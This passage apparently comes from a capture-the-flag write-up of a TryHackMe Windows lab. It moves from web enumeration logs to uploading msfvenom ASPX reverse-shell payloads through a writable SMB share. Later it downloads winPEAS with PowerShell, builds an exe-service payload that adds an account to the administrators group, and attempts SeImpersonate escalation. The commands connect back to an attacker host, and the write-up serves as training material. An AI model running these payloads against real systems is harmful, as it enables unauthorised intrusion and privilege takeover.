+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/co-op: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/jbe: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/242906: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/stampa: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/rdiff-backup: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/msg00289: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:13 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/registrati: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:14 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/1931836663: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:14 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/msg00282: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:14 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/windows_firewall: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:14 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/MDaemon-AntiVirus: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/ViRobot: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/mail-server: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/cavs: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/ezines: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/0072256753: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/koops: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/level0: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/gry_online: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/tipsy: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/showdetail: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/donkiely: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/PEN: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/czytaj: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/tiesto: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:48:17 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/000264: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:56:23 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/28755: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:56:23 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/54874: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+<span style="color:#f92672">[</span>ERROR<span style="color:#f92672">]</span> 2020/09/11 14:56:23 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Get http://10.10.36.157:49663/87764: net/http: request canceled <span style="color:#f92672">(</span>Client.Timeout exceeded <span style="color:#66d9ef">while</span> awaiting headers<span style="color:#f92672">)</span>
+/nt4wrksv <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+2020/09/11 15:35:38 Finished
+<span style="color:#f92672">===============================================================</span>
+</code></pre></div><p>After several <code>ERROR</code> logs we get one directory: <code>/nt4wrksv (Status: 301)</code> with the same name as one of the SMB shares we found before. Let&rsquo;s see if we can do anything there. Since the name is exactly the same as the SMB share, we can speculate that this URL is communicating to that share.</p>
+<p>If we recall from our previous SMB enumeration and the files we found there, we know there is a <code>passwords.txt</code> file on that share. Let&rsquo;s see if we can reach that file via browser:</p>
+<blockquote>
+<p>(Not sure if I&rsquo;m doing something wrong, or if any of my scans are causing the remote machine deployed on THM to die on me every now and then. First time happening honestly, I doubt there is something wrong with the room. But I have to keep killing and redeploying the machine quite often once it becomes totally unresponsive randomly.)</p>
+</blockquote>
+<p><img src="https://i.imgur.com/y6rcQb0.png" alt="We can get passwords.txt on that URL"></p>
+<p>So far our enum results are these:</p>
+<ul>
+<li>We found the following open ports:
+<ul>
+<li><code>80, 135, 139, 445, 3389, 49663, 49666, 49668</code></li>
+</ul>
+</li>
+<li>We found the following SMB shares:
+<ul>
+<li><code>ADMIN$, C$, IPC$, nt4wrksv</code></li>
+</ul>
+</li>
+<li>We found the following file on <code>nt4wrksv</code>:
+<ul>
+<li><code>passwords.txt</code> which as of this point we can assume it was a decoy.</li>
+</ul>
+</li>
+</ul>
+<p>Before we move on let&rsquo;s see if we can access <strong>any</strong> file on that share via the browser. Here is the idea, we&rsquo;ll connect to the SMB share as we did before when I downloaded the <code>passwords.txt</code> file. But this time we&rsquo;ll see if we can <strong>upload</strong> a file into the share and then check if we can access that file via the browser. The idea is to get proof we can potentially upload a malicious file to get a foothold on that server.</p>
+<p>Let&rsquo;s connect to that SMB share and upload anything.</p>
+<p>I created a file <code>proof.txt</code> with some text on it, then I connected to the SMB share:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ smbclient //10.10.184.94/nt4wrksv/ -U annonymous
+Enter WORKGROUP<span style="color:#ae81ff">\a</span>nnonymous<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> put proof.txt
+putting file proof.txt as <span style="color:#ae81ff">\p</span>roof.txt <span style="color:#f92672">(</span>0.1 kb/s<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 kb/s<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\&gt;</span> 
+</code></pre></div><p>Now for the moment of truth, let&rsquo;s try to get that file using the browser:</p>
+<p><img src="https://i.imgur.com/6HCe7JF.png" alt="we can access proof.txt without issues"></p>
+<p>There you have it, we have proof that a potential file can be freely uploaded and access. Which means we have <code>READ/WRITE</code> permissions.</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>We have a possible way of attacking this machine, we need a payload we can upload to get ourselves a reverse shell. Let&rsquo;s find out how to create an <code>asp</code> payload with <strong>msfvenom</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f asp &gt; tzshell.asp
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span style="color:#ae81ff">324</span> bytes
+Final size of asp file: <span style="color:#ae81ff">38397</span> bytes
+</code></pre></div><p>Now just like we did with <code>proof.txt</code> we upload the <code>tzshell.asp</code> file to the share:</p>
+<p><code>smb: \&gt; put tzshell.asp putting file tzshell.asp as \tzshell.asp (18.9 kb/s) (average 11.7 kb/s)</code></p>
+<p>Let&rsquo;s open a listener on port <code>4444</code> and then try to load that file in the browser:</p>
+<p><img src="https://i.imgur.com/h8UyUwU.png" alt="We don&rsquo;t have luck this time"></p>
+<p>We get an error and our listener does not pick any connection. Probably our payload was not good.</p>
+<p>If we research a bit around MS IIS to see if maybe we can generate a payload in another format. We found out that we could try another format <code>.aspx</code> and craft a new payload with it.</p>
+<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 -f aspx &gt; tzshell.aspx </code></p>
+<p>I went ahead and uploaded it to the share. Let&rsquo;s see if this works now.</p>
+<blockquote>
+<p>Remember to ready the listener if you closed it before.</p>
+</blockquote>
+<p>It did not work either. This time the page did not throw any error, just loaded a blank page. However, we did not get any reverse shell.
+Time to think about this a bit more, what I&rsquo;m doing wrong?</p>
+<ul>
+<li>Could still be a payload issue? yup, probably.</li>
+</ul>
+<p>Or maybe the problem is actually the way we are trying to access the payload&hellip; the fact that our <code>proof.txt</code> file can be accessed via the browser might not actually indicate that we can execute our <code>tzshell.aspx</code> via the browser too.</p>
+<p>I ended up trying <code>wget</code>ing the file (wtf I&rsquo;m doing), and <code>curl</code>, neither worked. I think we definitely have a bad payload&hellip;</p>
+<p><img src="https://i.imgur.com/O7kZwJr.png" alt=""></p>
+<p>I need to invest a bit more time with <strong>msfvenom</strong> and see another way of creating an <strong>aspx</strong> file. I suspect I&rsquo;m doing something wrong when generating it.
+Googling around I found a clue, and I had to do with how I generated the payload.</p>
+<blockquote>
+<p>Check the related post on ASP payload generation I mentioned <a href="https://isc.sans.edu/forums/diary/Analyzing+Metasploit+ASP+NET+Payloads/26392/">here</a>
+Though it talks about meterpreter payload, I&rsquo;m sticking to a plain shell for now.</p>
+</blockquote>
+<p>Let&rsquo;s see what generated before: <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 -f asp &gt; tzshell.asp</code></p>
+<p>You see the problem? I generated a <code>windows/shell_reverse_tcp</code>, I assumed that was the correct setting. But turns out that we also can do this for x64:</p>
+<p><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 -f aspx &gt; tzshell3.aspx</code></p>
+<p>Let&rsquo;s generate that payload, upload, and try to run it.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/relevant<span style="color:#f92672">]</span>
+└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f aspx &gt; tzshell3.aspx                                                     <span style="color:#ae81ff">2</span> ⨯
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: <span style="color:#ae81ff">460</span> bytes
+Final size of aspx file: <span style="color:#ae81ff">3403</span> bytes
+</code></pre></div><p>If we try to run this right from the browser, this time it works:</p>
+<p><img src="https://i.imgur.com/rVFArR1.png" alt="We open the new payload in the browser directyl"></p>
+<p>and we get the reverse shell right away:</p>
+<p><img src="https://i.imgur.com/1Xw0knt.png" alt="rev shell"></p>
+<p>if we run <code>whoami</code> we get <code>iis apppool\defaultapppool</code>.</p>
+<p>We have some initial foothold in this machine now, let&rsquo;s see if we can look around the files a little.
+Seems that Bob is a valid username.</p>
+<p><img src="https://i.imgur.com/PIQEyOu.png" alt="We found Bob"></p>
+<p>If we look into Bob&rsquo;s Desktop folder we see something the client wants :smile:</p>
+<p><img src="https://i.imgur.com/gxlpnQw.png" alt="We found the user.txt flag"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\B</span>ob<span style="color:#ae81ff">\D</span>esktop&gt;type user.txt
+type user.txt
+THM<span style="color:#f92672">{</span>fdkREDACTEDktf45<span style="color:#f92672">}</span>
+c:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\B</span>ob<span style="color:#ae81ff">\D</span>esktop&gt;
+</code></pre></div><p>Of course, if we try to navigate into <code>Administrator</code> we get a fine <code>Acess denied</code>. Let&rsquo;s try to run <code>winPEAS</code> to do some recon.
+I&rsquo;ll be using <code>winPEAS.bat</code> version (there is a .exe version as well), you can get it <a href="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat">here</a>.</p>
+<p>I start a simple <code>python -m SimpleHTTPServer 2112</code> in our fav port.</p>
+<p>As I try to <code>wget</code> that file from the rev shell session, the deployed machine <strong>stops responding again</strong>! I don&rsquo;t really know what the problem is&hellip;</p>
+<p><img src="https://i.imgur.com/LAlIEYa.png" alt="The VM still has time left"></p>
+<p>As you can see there is still time left before the VM expires. Maybe is my VPN connection failing and that&rsquo;s why I lost communication with the VM?
+I changed to another VPN server location on THM and reconnected. The VM is still not responding, not even ping. I&rsquo;ll just terminate and redeploy again I guess.</p>
+<p>I went ahead and performed all the steps that we saw until I get the reverse shell again. Let&rsquo;s upload winPEAS and run it. Here another nice thing of this room, neither curl nor wget worked. But we do have Powershell.</p>
+<blockquote>
+<p>Check <a href="https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/">this page</a> for a bit more on downloading files with Powershell.</p>
+</blockquote>
+<p><code>Invoke-WebRequest -Uri &quot;http://10.13.0.34:2112/winPEAS.bat&quot; -OutFile &quot;winPEAS.bat&quot;</code></p>
+<p>And this time we succeed. Nothing like the nth time charm :laughing:</p>
+<p><img src="https://i.imgur.com/KjQdKLR.png" alt="We get winPEAS uploaded"></p>
+<p>Let&rsquo;s run that <code>winPEAS.bat</code> thing before anything else happens (looks angrily at the VM expiration timer). The results from this tool are quite large, particularly the Unquoted service paths sections kind of seemed familiar to me. I don&rsquo;t recall which other room on THM had me exploit those. Let&rsquo;s try that out</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-&gt; <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> UNQUOTED SERVICE PATHS &lt;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> When the path is not quoted <span style="color:#f92672">(</span>ex: C:<span style="color:#ae81ff">\P</span>rogram files<span style="color:#ae81ff">\s</span>oft<span style="color:#ae81ff">\n</span>ew folder<span style="color:#ae81ff">\e</span>xec.exe<span style="color:#f92672">)</span> Windows will try to execute first <span style="color:#e6db74">&#39;C:\Progam.exe&#39;</span>, <span style="color:#66d9ef">then</span> <span style="color:#e6db74">&#39;C:\Program Files\soft\new.exe&#39;</span> and finally <span style="color:#e6db74">&#39;C:\Program Files\soft\new folder\exec.exe&#39;</span>. Try to create <span style="color:#e6db74">&#39;C:\Program Files\soft\new.exe&#39;</span>
+<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> The permissions are also checked and filtered using icacls
+  <span style="color:#f92672">[</span>?<span style="color:#f92672">]</span> https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services
+aspnet_state 
+ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\M</span>icrosoft.NET<span style="color:#ae81ff">\F</span>ramework64<span style="color:#ae81ff">\v</span>4.0.30319<span style="color:#ae81ff">\a</span>spnet_state.exe 
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\M</span>icrosoft.NET<span style="color:#ae81ff">\F</span>ramework64<span style="color:#ae81ff">\v</span>4.0.30319<span style="color:#ae81ff">\a</span>spnet_state.exe NT SERVICE<span style="color:#ae81ff">\T</span>rustedInstaller:<span style="color:#f92672">(</span>F<span style="color:#f92672">)</span>
+
+AWSLiteAgent 
+ C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\A</span>mazon<span style="color:#ae81ff">\X</span>enTools<span style="color:#ae81ff">\L</span>iteAgent.exe 
+Invalid parameter <span style="color:#e6db74">&#34;Files\Amazon\XenTools\LiteAgent.exe&#34;</span>
+NetTcpPortSharing 
+ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\M</span>icrosoft.NET<span style="color:#ae81ff">\F</span>ramework64<span style="color:#ae81ff">\v</span>4.0.30319<span style="color:#ae81ff">\S</span>MSvcHost.exe 
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\M</span>icrosoft.NET<span style="color:#ae81ff">\F</span>ramework64<span style="color:#ae81ff">\v</span>4.0.30319<span style="color:#ae81ff">\S</span>MSvcHost.exe NT SERVICE<span style="color:#ae81ff">\T</span>rustedInstaller:<span style="color:#f92672">(</span>F<span style="color:#f92672">)</span>
+
+PerfHost 
+ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWow64<span style="color:#ae81ff">\p</span>erfhost.exe 
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\S</span>ysWow64<span style="color:#ae81ff">\p</span>erfhost.exe NT SERVICE<span style="color:#ae81ff">\T</span>rustedInstaller:<span style="color:#f92672">(</span>F<span style="color:#f92672">)</span>
+
+PsShutdownSvc 
+ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\P</span>SSDNSVC.EXE 
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\P</span>SSDNSVC.EXE NT AUTHORITY<span style="color:#ae81ff">\S</span>YSTEM:<span style="color:#f92672">(</span>I<span style="color:#f92672">)(</span>F<span style="color:#f92672">)</span>
+
+TrustedInstaller 
+ C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ervicing<span style="color:#ae81ff">\T</span>rustedInstaller.exe 
+C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ervicing<span style="color:#ae81ff">\T</span>rustedInstaller.exe NT SERVICE<span style="color:#ae81ff">\T</span>rustedInstaller:<span style="color:#f92672">(</span>F<span style="color:#f92672">)</span>
+
+</code></pre></div><p>Let&rsquo;s try that then, we need to create a new payload that needs to be a service with some name that we can exploit from one of those available unquoted service names.</p>
+<p>We can create a payload with msfvenom:</p>
+<p><code>msfvenom -p windows/exec CMD=&quot;net localgroup administrators defaultapppool /add&quot; -f exe-service -o xentools.exe</code></p>
+<p>Let&rsquo;s break this down a bit. We need to make sure we add the user to the administrator&rsquo;s group, and we need to carefully choose the file name. Let&rsquo;s try this one <code>AWSLiteAgent C:\Program Files\Amazon\XenTools\LiteAgent.exe</code> so we&rsquo;ll call or payload file <code>xentools.exe</code></p>
+<p>We use Powershell once again to upload the payload to the machine:</p>
+<p><code>Invoke-WebRequest -Uri &quot;http://10.13.0.34:2112/xentools.exe&quot; -OutFile &quot;C:/Program Files/Amazon/&quot;</code></p>
+<p>We are able to successfully upload our payload:</p>
+<p><img src="https://i.imgur.com/jBMeYEZ.png" alt="Uploaded the payload"></p>
+<p>If we look at the services <code>net start</code> we get the following:</p>
+<p><img src="https://i.imgur.com/j9xh02x.png" alt=""></p>
+<p>However, we don&rsquo;t have permission to start/stop services&hellip;</p>
+<p>And guess what? the VM died on me again. :cry:</p>
+<p>I have been sitting at this PC from 9AM to 6PM for work, then picked this room up from where I left last night. I&rsquo;m super tired, can&rsquo;t think honestly. Not-fun fact: I suffer migraines, really bad ones. I need to take some time off the screen. I&rsquo;ll continue tomorrow.</p>
+<p><img src="https://i.ytimg.com/vi/KTpd-CEJahw/maxresdefault.jpg" alt=""></p>
+<p>Let&rsquo;s continue with this awesome room. We need to figure out a way to exploit this machine to get ourselves root, obviously. But how can we achieve that?
+Looking back at the results from winPEAS we see something interesting:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+<span style="color:#f92672">=============================</span> <span style="color:#f92672">=========================================</span> <span style="color:#f92672">========</span>
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas <span style="color:#66d9ef">for</span> a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+</code></pre></div><p>We seem to have a <code>SeImpersonatePrivilege Impersonate a client after authentication Enabled</code>, which we could potentially try to exploit.
+Searching around I find this link on the awesome <code>hacktricks</code> book, check it <a href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/rottenpotato">here</a>. The attack is called <code>rotten potato</code> and I&rsquo;m not really familiar with what it does.</p>
+<p>Luckily there is a link that explains this in-depth, <a href="">here</a>.</p>
+<blockquote>
+<p><strong>The idea behind this vulnerability is simple to describe at a high-level</strong>:</p>
+<ol>
+<li>Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.</li>
+<li>Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.</li>
+<li>Impersonate the token we have just negotiated. This can only be done if the attacker&rsquo;s current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.</li>
+</ol>
+</blockquote>
+<p>I&rsquo;m not sure if we should proceed with that, it could very well be another decoy. Let me research around a bit more to see if there is any other way to exploit the same.</p>
+<p>There is a tool for this, called <strong>RogueWinRM</strong> located <a href="https://github.com/antonioCoco/RogueWinRM">here</a> that looks interesting and pretty straightforward.
+Let&rsquo;s reopen our rev shell session, upload the exploit, and try to execute it.</p>
+<p>Yup, it does not work. After I few tries I get the target is not exploitable by this exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">Listening <span style="color:#66d9ef">for</span> connection on port <span style="color:#ae81ff">5985</span> .... 
+Error: WinRM already running on port 5985. Unexploitable!
+bind failed with error: <span style="color:#ae81ff">10013</span>
+</code></pre></div><p>Let&rsquo;s google some more and see if there is another tool out there. It seems there is another similar tool called <strong>PrintSpoofer</strong> that you can get <a href="https://github.com/itm4n/PrintSpoofer">here</a>.</p>
+<p>I&rsquo;m gonna quickly try this one as well, I downloaded <code>PrintSpoofer64.exe</code> and upload it to the server.</p>
+<p>we get some examples of how privesc with this tool:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">Examples:
